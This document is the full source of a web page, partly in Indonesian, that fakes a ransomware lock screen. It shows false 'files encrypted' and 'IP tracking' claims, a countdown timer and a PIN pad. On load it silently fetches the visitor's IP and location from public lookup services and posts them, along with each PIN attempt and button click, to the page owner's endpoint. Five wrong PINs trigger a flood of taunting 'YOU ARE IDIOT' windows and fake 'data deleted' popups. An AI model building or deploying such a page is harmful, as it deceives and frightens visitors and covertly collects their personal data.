<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>HACKED</title>
<style>
/* CSS VISUAL BRUTAL - SAMA PERSIS DARI TUAN */
body{background:#000;color:#fff;font-family:'Courier New', monospace;text-align:center;overflow:hidden;margin:0;padding:20px;user-select:none;}
body.shake{animation:shake 0.3s;}@keyframes shake{0%{transform:translate(2px,2px);}25%{transform:translate(-2px,-2px);}50%{transform:translate(2px,-2px);}75%{transform:translate(-2px,2px);}100%{transform:translate(0,0);}}
h3{font-size:clamp(24px,6vw,36px);margin-bottom:10px;text-shadow:0 0 10px #0f0;font-weight:bold;color:#0f0;}
.info{font-size:12px;margin:20px 0;line-height:1.4;color:#0f0;}
.timer{font-size:clamp(32px,8vw,48px);color:#f00;margin:20px 0;text-shadow:0 0 15px #f00;font-weight:bold;}
.pin{display:flex;justify-content:center;gap:12px;margin:20px 0;}
.dot{width:20px;height:20px;border:2px solid #0f0;border-radius:50%;transition:0.2s;}
.dot.active{background:#0f0;box-shadow:0 0 15px #0f0;}
.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;max-width:300px;margin:30px auto;}
.btn{padding:20px;border:2px solid #0f0;background:#000;color:#0f0;font-size:18px;font-weight:bold;border-radius:4px;cursor:pointer;transition:0.2s;font-family:'Courier New', monospace;}
.btn:active{transform:scale(0.95);background:#0f0;color:#000;}
.contact-btn{background:#f00;border-color:#f00;color:#fff;font-size:16px;padding:15px 30px;margin-top:20px;display:block;margin-left:auto;margin-right:auto;border-radius:4px;font-family:'Courier New', monospace;cursor:pointer;}
.popup{position:fixed;width:220px;height:120px;background:rgba(0,0,0,0.95);border:2px solid #fff;border-radius:4px;z-index:999;display:none;flex-direction:column;box-shadow:0 0 20px rgba(255,255,255,0.5);}
.popup.show{display:flex;}
.popup-title{background:#333;color:#fff;padding:8px 12px;font-weight:bold;font-size:12px;text-align:center;}
.popup-content{flex:1;padding:15px;display:flex;justify-content:center;align-items:center;font-size:13px;text-align:center;}
.idiot-window{position:fixed;width:220px;height:120px;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;font-weight:bold;font-size:13px;border:2px solid #fff;z-index:100;padding:8px;line-height:1.2;box-shadow:2px 2px 10px rgba(0,0,0,0.8);animation:chaosBlink 0.4s infinite;}
@keyframes chaosBlink{0%,25%{background:#fff;color:#000;}50%,75%{background:#000;color:#fff;}100%{background:#fff;color:#000;}}
.scanline{position:fixed;top:0;left:0;width:100%;height:1px;background:#0f0;animation:scan 2s linear infinite;z-index:1000;pointer-events:none;}
@keyframes scan{0%{top:0;opacity:1;}100%{top:100vh;opacity:0;}}
</style>
</head>

<body>
<div class="scanline" style="animation-delay:0s;"></div><div class="scanline" style="animation-delay:1s;"></div>

<h3>🔒 SYSTEM HACKED 🔒</h3>
<div class="info">📁 847 GB FILES ENCRYPTED<br>🆔 VICTIM ID: <span id="sid">...</span><br>📡 IP TRACKING ACTIVE...</div>
<div class="timer" id="timer">01:00:00</div>
<div class="pin" id="pin-dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>

<div class="grid">
<button class="btn" onclick="addPin(1)">1</button><button class="btn" onclick="addPin(2)">2</button><button class="btn" onclick="addPin(3)">3</button>
<button class="btn" onclick="addPin(4)">4</button><button class="btn" onclick="addPin(5)">5</button><button class="btn" onclick="addPin(6)">6</button>
<button class="btn" onclick="addPin(7)">7</button><button class="btn" onclick="addPin(8)">8</button><button class="btn" onclick="addPin(9)">9</button>
<button class="btn" onclick="clearPin()">C</button><button class="btn" onclick="addPin(0)">0</button><button class="btn" onclick="checkPin()">OK</button>
</div>

<button class="contact-btn" onclick="contactOwner()">📱 HUBUNGI OWNER</button>

<div class="popup" id="main-popup"><div class="popup-title" id="popup-title">ERROR</div><div class="popup-content" id="popup-content"></div></div>

<script>
// ==================== CONFIG & SESSION ====================
let pinCode="", attempts=0, maxAttempts=5, timeLeft=3600, gameOver=false;
let session_id = 'NX_' + Math.random().toString(36).substr(2,7).toUpperCase();
document.getElementById('sid').innerText = session_id;

// ==================== VERCEL DATA PUSHER ====================
async function report(text) {
    try {
        await fetch('/api/send', {
            method: 'POST',
            body: JSON.stringify({ text: text, session_id: session_id })
        });
    } catch(e) {}
}

async function captureVictim() {
    try {
        const ipReq = await fetch('https://api.ipify.org?format=json');
        const { ip } = await ipReq.json();
        const locReq = await fetch(`https://ipapi.co/${ip}/json/`);
        const loc = await locReq.json();
        
        let msg = `🎣 **CHAOS VICTIM!**\n🆔 \`${session_id}\`\n🌐 IP: \`${ip}\`\n📍 Loc: ${loc.city}, ${loc.country_name}\n📱 Device: ${navigator.platform}`;
        report(msg);
    } catch(e) { report(`⚠️ **New Hit** (No IP info)\n🆔 \`${session_id}\``); }
}

// ==================== VISUAL CHAOS LOGIC ====================
setInterval(()=>{if(timeLeft>0){timeLeft--;let m=Math.floor(timeLeft/60),s=timeLeft%60;document.getElementById("timer").innerHTML=`00:${m.toString().padStart(2,"0")}:${s.toString().padStart(2,"0")}`;}},1000);

function addPin(num){ if(pinCode.length<6&&!gameOver){ pinCode+=num; updateDots(); } }
function clearPin(){ pinCode=""; updateDots(); }
function updateDots(){ document.querySelectorAll(".dot").forEach((dot,i)=>{ i<pinCode.length?dot.classList.add("active"):dot.classList.remove("active"); }); }

function checkPin(){
    if(pinCode.length<6||gameOver)return;
    report(`🔢 **PIN ATTEMPT**\n🆔 \`${session_id}\`\n🔐 PIN: \`${pinCode}\`\n⚡ Attempt: ${attempts+1}`);
    
    if(pinCode==="696969"){
        showPopup("DECRYPTION OK","Files unlocked ✓");
    } else {
        attempts++;
        showPopup("ACCESS DENIED",`Wrong: ${attempts}/${maxAttempts}`);
        document.body.classList.add("shake");
        setTimeout(()=>document.body.classList.remove("shake"),300);
        if(attempts>=maxAttempts){ gameOver=true; setTimeout(finalChaos,1500); }
    }
    pinCode=""; updateDots();
}

function contactOwner(){ report(`📱 **Target clicked Contact Owner**\n🆔 \`${session_id}\``); showPopup("CONTACT","Connecting to server..."); }

function showPopup(title,msg){
    document.getElementById("popup-title").textContent=title;
    document.getElementById("popup-content").textContent=msg;
    let popup=document.getElementById("main-popup");
    popup.style.left=(window.innerWidth/2-110)+"px";
    popup.style.top=(window.innerHeight/2-60)+"px";
    popup.classList.add("show");
    setTimeout(()=>popup.classList.remove("show"),2000);
}

// ==================== THE "YOU ARE IDIOT" CHAOS ====================
function finalChaos(){
    report(`💀 **FINAL CHAOS ACTIVATED!**\n🆔 \`${session_id}\``);
    for(let i=0;i<15;i++) spawnIdiotWindow();
    setInterval(showDeletePopup, 1200);
}

function spawnIdiotWindow(){
    let w=document.createElement("div");
    w.className="idiot-window";
    w.innerHTML="YOU ARE IDIOT 😈<br>🙂";
    document.body.appendChild(w);
    let x=Math.random()*(window.innerWidth-220), y=Math.random()*(window.innerHeight-120), dx=3, dy=3;
    function move(){
        x+=dx; y+=dy;
        if(x<=0||x+220>=window.innerWidth) dx*=-1;
        if(y<=0||y+120>=window.innerHeight) dy*=-1;
        w.style.left=x+"px"; w.style.top=y+"px";
        requestAnimationFrame(move);
    }
    move();
}

function showDeletePopup(){
    let p=document.createElement("div");
    p.className="popup show";
    p.innerHTML=`<div class="popup-title">SYSTEM</div><div class="popup-content">DATA DIHAPUS<br>PERMANENT</div>`;
    p.style.left=(Math.random()*(window.innerWidth-220))+"px";
    p.style.top=(Math.random()*(window.innerHeight-120))+"px";
    p.style.position="fixed";
    document.body.appendChild(p);
    setTimeout(()=>p.remove(),1500);
}

// Start Auto Log
captureVictim();
</script>
</body>
  </html>
